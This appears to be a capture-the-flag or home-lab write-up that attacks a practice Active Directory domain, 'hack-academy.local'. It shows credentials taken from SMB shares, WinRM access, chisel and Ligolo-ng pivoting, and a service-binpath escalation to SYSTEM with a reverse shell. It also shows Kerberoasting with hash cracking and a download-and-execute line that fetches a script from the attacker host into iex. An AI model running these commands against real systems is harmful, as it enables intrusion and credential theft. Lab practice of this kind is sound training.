
# SMB as eturner

Was able to retrieve files from IT-Support and InternalApps folders:

```
└─$ tree
.
├── InternalApps
│   ├── deploy.ps1
│   └── readme.txt
└── IT-Support
    ├── backup-schedule.txt
    ├── firewall-policy.txt
    └── onboarding-checklist.txt
```

Reading through the IT-Support share's files shows what default passwords may likely be:

```
┌──(xmen㉿kali)-[~/chain2/IT-Support]
└─$ cat backup-schedule.txt 
Backup Schedule
================
Nightly at 3:00 AM - full backup via svc_backup (retired).
Weekly Sunday 2:00 AM - offsite sync. Contact IT for restore requests.
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~/chain2/IT-Support]
└─$ cat firewall-policy.txt 
Firewall Policy
=================
All outbound traffic allowed.
Inbound: WinRM (5985), RDP (3389), SMB (445) only.
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~/chain2/IT-Support]
└─$ cat onboarding-checklist.txt 
New Employee Onboarding Checklist
===================================
[ ] Create AD account
[ ] Set temp password: Welcome + current year
[ ] Add to appropriate groups
[ ] Configure workstation
[ ] Issue hardware
```

Reading the InternalApps share showed other credentials as well:

```
┌──(xmen㉿kali)-[~/chain2/InternalApps]
└─$ cat readme.txt              
InternalApps Share
==================
This share contains internal deployment scripts and application configs.
For access issues contact: it-support@hack-academy.local
Last updated: 2024-08-19
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~/chain2/InternalApps]
└─$ cat deploy.ps1 
# WebAPI Deployment Script
# Deploys the internal WebAPI service on CLIENT-1
# Last modified: 2024-08-19

$DeployUser = "hack-academy\svc_webapi"
$DeployPass = "Andrew,3"
$ServicePath = "C:\Services\WebAPI"
$ServiceName = "WebAPIService"

$SecurePass = ConvertTo-SecureString $DeployPass -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($DeployUser, $SecurePass)

Write-Host "[*] Deploying WebAPI service as $DeployUser..."
Copy-Item "\\FILESERV01\deploy\webapi-svc.exe" -Destination $ServicePath -Credential $Cred
sc.exe start $ServiceName
Write-Host "[+] WebAPI deployment complete."
```

Added both to a user and pass files for more enum but got not much else. Unable to xfreerdp as either user.

Based on the firewall doc, I also looked at winrm and looks like svc_webapi can winrm:

```
┌──(xmen㉿kali)-[~/chain2]
└─$ netexec winrm 192.168.1.218 -u users -p passwords --continue-on-success
WINRM       192.168.1.218   5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) 
WINRM       192.168.1.218   5985   CLIENT-1         [+] hack-academy.local\svc_webapi:Andrew,3 (Pwn3d!)
WINRM       192.168.1.218   5985   CLIENT-1         [-] hack-academy.local\eturner:Andrew,3
WINRM       192.168.1.218   5985   CLIENT-1         [-] hack-academy.local\svc_backup:Andrew,3
WINRM       192.168.1.218   5985   CLIENT-1         [-] hack-academy.local\it-support:Andrew,3
WINRM       192.168.1.218   5985   CLIENT-1         [-] hack-academy.local\eturner:Ya-Boy14
WINRM       192.168.1.218   5985   CLIENT-1         [-] hack-academy.local\svc_backup:Ya-Boy14
WINRM       192.168.1.218   5985   CLIENT-1         [-] hack-academy.local\it-support:Ya-Boy14
```

From here I used evil-winrm to get first shell as svc_webapi.

```
┌──(xmen㉿kali)-[~/chain2]
└─$ evil-winrm -u 'svc_webapi' -p 'Andrew,3' -i 192.168.1.218
```

Using net user, found out that there is a Nick user as well. I proceeded to upload chisel to see if I could get access to the Domain Controller e.t.c. Used [[port-forwarding-with-chisel#Reverse Dynamic SOCKS Proxy]] to establish a socks proxy through the svc_webapi user and use proxychains to run nmap on the internal network. While running this scan without ping to see up hosts gave a "host is up" for each one, getting hostnames showed what was actually useful:

```
──(xmen㉿kali)-[~/chain2]
└─$ proxychains nmap -sn -Pn 10.0.2.26/24
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-11 18:30 -0400
Nmap scan report for 10.0.2.0
Host is up.
Nmap scan report for 10.0.2.1
Host is up.
Nmap scan report for 10.0.2.2
Host is up.
Nmap scan report for 10.0.2.3
Host is up.
Nmap scan report for DC01.hack-academy.local (10.0.2.4)
Host is up.
Nmap scan report for 10.0.2.5
Host is up.
Nmap scan report for 10.0.2.6
Host is up.
Nmap scan report for client-1.hack-academy.local (10.0.2.7)
Host is up.
Nmap scan report for 10.0.2.8
Host is up.
Nmap scan report for client-2.hack-academy.local (10.0.2.9)
```


This showed that there were 2 machines and client-1 itself:

```
DC01.hack-academy.local (10.0.2.4)
client-1.hack-academy.local (10.0.2.7)
client-2.hack-academy.local (10.0.2.9)
```

From here I started trying to scan each one in depth but ran into issues with filtered ports and timing of nmap scans.

So instead, I started by enumerating with winPEAS for any easy privilege escalation opportunities. WinPEAS gave nothing but running [[exploit-notes/windows/privilege-escalation/index#Automation|PrivescCheck.ps1]] worked by passing it in as a wget piped into iex:

```
wget -useb 192.168.1.217/PrivescCheck.ps1|iex;Invoke-PrivescCheck -Extended -Audit
```

This showed that the WebAPIService has a binpath we can modify due to having all access to it. It's also run as admin allowing an easy adding of our svc_webapi user to the Administrators group by modifying binpath and running the service via sc.exe:

```
sc.exe config WebAPIService binpath= "net localgroup administrators svc_webapi /add"


sc.exe start WebAPIService
```

This also allows for running a reverse shell as the privileged service using an msfvenom command to generate the exe, uploading it and setting it as binpath.

```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 

C:\Windows\system32>whoami
whoami
nt authority\system
```

This gives us system on Client-1. From here, I uploaded SharpHound using winrm and then in the reverse shell, ran the collector.

From here, after getting a good reverseshell as nt system, I also ran powerview's Request-SPNTicket as in [[kerberoast#Windows]] to get 2 hashes:

```
─$ cat kerberoast.csv             
"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"krbtgt","CN=krbtgt,CN=Users,DC=hack-academy,DC=local","kadmin/changepw",,"$krb5tgs$18$*krbtgt$hack-academy.local$kadmin/changepw*$BF17DB2B85DB41E53E2D8A944026E71E$2F79194B0D0961049641FA4F7DB460DA721154863D2527EE4D6F6BFC83A6DC40C370DEB970A57A9E2B508ACE8CBE077CE2A6A7CD1B7669D04D6474306D4A9C314191DF9BB8091E4D73176383DA9655E6B3DD9041667C91F1C67FFF4D029373AAFA0B7CFB0F0F3CBF56497F39A5B71456680A725B1C3C69F0D8BC1B9137B33116D1E1AA9539C5A14AF58157D325C3DF3D537D9CA462A1FCA2A1B1AABC0FC390B21747C7296514E9BD7027334885389C65D4F77A607F9A89901F48F3ABF6AC8F453FD1BACA12276485D12729E41FE72E4EC69AE087F5E5ED650381989C30AF2D04AA660A13E4D862AA3431B18D45DD6CCB93BA63681D6642D9275A8263C8BDAB5A4D8C3E51A42B75F4A91607FBB3FC42F24C4AED3B8E65C0409830563320979B7DC842D6DC124104111DA6686C2805B0F0F6D32EEA9C6EFF140608C28ECE9A93D3A4B2A8E013F135CC590010F964BE63AEA9B36ED9BB804BABF6F275CAF3D920789DB3BEA85245FFD4327E015536FB880AA9756927A1BFE18145A4BC355EF57F1762018F86EA473BBF683CB7A05E2F28482ADD857738E974FE8EA68FBBE5B616F9DACB950A5813FE66E341191EFD05CFA3EA47F0AC5C82230BCF2810789EDCA563616F9059220FA36D6C6FAD969A5B04EDC568ADB936A85906C07E7335E9CD2AB4B04C1F00977486AD6AA05CE2619C129D0DB0644ED3241FFE2C4308C7D363FBE605D52604C92271FD4739C6B36DABEA422C1CF6FCC118E7597A1882108F8DDB059960DD011999E40DD73648899B3FF566D57D54A2900BCD80A386CE4B6B7C385DA6B3234ABADCA391372022860FF4B1048C18E156752DEFAD64A7CB3A2065EEBAED1FD01C80E2DDD5EC47A79EC696B1FBA30ADA8BA3807AA5D3AFF0B98A73A16C2270A6583E14BFCFA5B025FF03A181AFCC71CF35BAE46BE728C63319A72432D0786569AF2DFA639BDC542ABA49E30AFD3ECD51AC707A0EA94C76D8346A9D14F932FC53F35604DF5CC4B442F56A2FA5934BB2BF1575B7139D34A5F5ACB7B7E4DE6D56AD31815F68C9B74BAB1A4007BE19553EA38E7DF0FF8FC5E556C22264D39B35E09F5C11B842D2A69B21A587E7CB87904B43365D0B8E6FD018D689B8AE4FD7325FD749F2E59EC6959EA80939856D86494703DEFE9717B82D27FFB23C805AF649BF4545A376F46CEE86C5E14B9E351D8CFC6BEDB3386333750736C6284C30EA31721D3BF57BAC0E1EBC464A18C276A008DD7A594CEA4F5BB15369EC32849C7FA9E605AA79E60F91D451D37C6493693547C96F203B5EEE69593A88339770EDAF29379D85DD031FAB92B7FBB37CD60F0CE93F61ECDD3A17DF314C1A07CB03AC2DACD04BB3B3F9C96C68D99ADADAEFBB8C155033BDDA2D3195E5B446CC3954A2DC36B584BA1291DD2DDD82828179E168FDB33BB54FA9BF23CC8580945B596268B85342B659865FF68BA5EA43746C0819B555075A16C61E1B7EBD11BA3D046A1C90B04B3700D5F37D42E6069319A4E6E308A322AC9F32C61DDEB2BB"
"svc_reports","CN=Reports Service,OU=ServiceAccounts,DC=hack-academy,DC=local","HTTP/REPORTS.hack-academy.local",,"$krb5tgs$23$*svc_reports$hack-academy.local$HTTP/REPORTS.hack-academy.local*$F4CEB26A3DD2B8FE2B91FDA751CFD2B6$E1B5A8E54E2279A8301FF898FBF86B89A19E4C317375E5A01A2E214873259FFD3CD94ADD9F88401251A37DD82F436A3DE54F2CF785036BC3D25C238FE9F87008D2EE645A8EDA55E43FC6858D24233B4CAC1EE15AEB3C9B0C9DAD3D40A03E5CE994BE6173D566E250182BE8D4C8B3208F9374F2E1D917DBAA73B7FAA6EC1AD63AD288685625E4A7B2B9D3E3523BE9B1E8DA35D83B36977E8D5839BB3118DEAE35562F07797F58F2121AB8B036C3DFDE1499E648F320DEA0DD755290791778DB3ED51AD1B21239A9F89DFFD72821B8BB0ACE50F7E8610062A8C8940F3710697E34E846F526CE5BF4C42E54EF3B251D9D9D62FF05A5719B366E6742AF3CD19E3A361FD16D7F8EA509EF09A4CA22A207AC7DC11207E1520C614D83CCAE99A5DFD8174B6D274600E9268677024BECBDD1E9294D55EED81FD8542C92825E7D1D74921A3857B333988BA1CFB65484C4763E12A97BA49993B83F967FCFE6792FEFF2C150B6F272EABC4CC8526D23EDE9185AE15ED2B98DEFEEE090A89E8B666F63E5919817F70092E94289380914A3658EC6E792BA7906472AF66FB5EB0205024C7F4FE18218FCC05F6928C4AA45E57A167F2251772AEBE9EE5AA37336BCA105BF91720D0A15C69FDFF233BA58A6B2086A352F22B56FE421E6073F0F478123216F724E7ADFBBBFC008AB2F59374F912BBDA6B3665048430C8117E57F926CD7E54C2ABF3A1C215C6DE586D4CDEA017885F1D18952C8791C627D03979817CA219018E5303145A8A7D48B70CD86D0C055AA5A028A571DFC5CA718DE20460AE3CC6D960A9702089D2FAF7189B060FDAEF7F89A5FE70828398F926AB176127D7C0F19CDD0CA116F3E369D098C75F0251E199B992F392771374780964044F8AE3577B500EA64D11D8C2B989AC20CAD64482ABE36723974A74DD0BBEABBDA545542C798F44A6DE4E0DA0643F7A9DDDCF64A19C3E98F699C9D8A22FEB04EB85EE5568A3B8A36E94540690955BE74D0812BC14DAB36A73869152D132E2B1787CF9DF250A78ACC8AE59790541BDBBDBDC364797D0897969D6C270C86F541141A0FE19F9D441C432BB7589BEBD9E660E3A4D3353FCA81A4E284518842EC8A34FD879BE31D761C05047CBE902058415B3694CA4C14E6462E93F033C9F4F06B6C9F7FFD7090057C1E60EE195D16DFDA04F553195A97BB7419D136BEADDB1CA540E88425EB1D489411C86449EA33D23C5F997C80DD45E04BF350D7A8E3349A3264E6931EB6BC17196D3D28BD311C1BEF640831A5B10FE61EA89B453C8955B9EAA60C7A4B91D7A98D6CB1467D5DD3435B9CF2BA5EEF412435B9F7C06F4BD37F2494422373D4A5C69D3CFAF036E5971A0D7134CF15BA9ADF256187876E8267D1AA6FCD09C9BC5FAFCAA2059FB0CE2BE2FFAE599DB8C31D2B3B77ECC98DF6799169C1FD35F823781F8F705E342FB2A093514CE9FC3B77BAB2212F7042AABAC641E9FACFBA66DD3F51F7654A399AF623E88FB71EEA1542727691E952D65F34BC4F9BBED5E304718BED68904524876DB7075C061C989E812094DC71"
```

Then used john to crack them:

```
┌──(xmen㉿kali)-[~/chain2]
└─$ john svc_reports_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Press 'q' or Ctrl-C to abort, almost any other key for status
(Evista-         (?)     
1g 0:00:00:15 DONE (2026-08-13 21:09) 0.06626g/s 948943p/s 948943c/s 948943C/s (H)fruity..(ELLA)LOVE
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(xmen㉿kali)-[~/chain2]
└─$ john krbtgt_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
```

This gave the password for svc_reports:

```
svc_reports : (Evista-
```

Also, digging through the file system, we found an appsettings.json hinting at a password for client 2:

```
C:\Windows\system32>cd C:\Services\WebConfig\
cd C:\Services\WebConfig\

C:\Services\WebConfig>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5CBB-FFE4

 Directory of C:\Services\WebConfig

04/13/2026  12:50 AM    <DIR>          .
04/13/2026  12:50 AM    <DIR>          ..
04/13/2026  12:50 AM               376 appsettings.json
               1 File(s)            376 bytes
               2 Dir(s)  21,718,720,512 bytes free

C:\Services\WebConfig>type appsettings.json
type appsettings.json
{
  "AppSync": {
    "TargetServer": "CLIENT-2",
    "ServiceUser": "hack-academy\\kpatel",
    "ServicePassword": "100%Mary",
    "Endpoint": "http://CLIENT-2:8080/api/sync",
    "Notes": "Jenkins API on CLIENT-2 - internal only, bound to localhost"
  },
  "Logging": {
    "LogLevel": "Warning",
    "LogPath": "C:\\Services\\WebAPI\\logs\\webapi.log"
  }
}

C:\Services\WebConfig>
```

This seems to be a password for kpatel on something on client 2.

From here, I set up [[tunneling-and-port-forwarding#Ligolo-ng|Ligolo-ng]] for pivoting and tried to scan the 10.0.2.0/24 with netexec smb:

```
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.1        445    ROCINANTE        [*] Windows 10 / Server 2019 Build 19041 x64 (name:ROCINANTE) (domain:Rocinante) (signing:False) (SMBv1:None)
SMB         10.0.2.100      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.26       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.27       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

This shows different ips over the ligolo tun interface

From here I started scanning client 2 and DC01

DC01:

```
Nmap scan report for 10.0.2.100
Host is up (0.19s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-14 03:27:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
65145/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-14T03:28:40
|_  start_date: N/A
|_clock-skew: -26s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:04:4e:92 (Oracle VirtualBox virtual NIC)
```

Client-2:

```
┌──(xmen㉿kali)-[~/chain2]
└─$ sudo nmap -sC -sV -p- -Pn --max-retries=1 10.0.2.27     
[sudo] password for xmen: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 22:52 -0400
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.30% done; ETC: 23:31 (0:38:11 remaining)
Stats: 0:01:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 5.17% done; ETC: 23:30 (0:36:03 remaining)
Stats: 0:20:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.40% done; ETC: 23:31 (0:18:16 remaining)
Stats: 0:24:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.67% done; ETC: 23:31 (0:14:12 remaining)
Warning: 10.0.2.27 giving up on port because retransmission cap hit (1).
Stats: 0:39:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 35.71% done; ETC: 23:33 (0:01:37 remaining)
Nmap scan report for 10.0.2.27
Host is up (0.11s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT-2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:39:8d:37 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-08-14T03:32:35
|_  start_date: N/A
|_clock-skew: -58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2492.01 seconds
```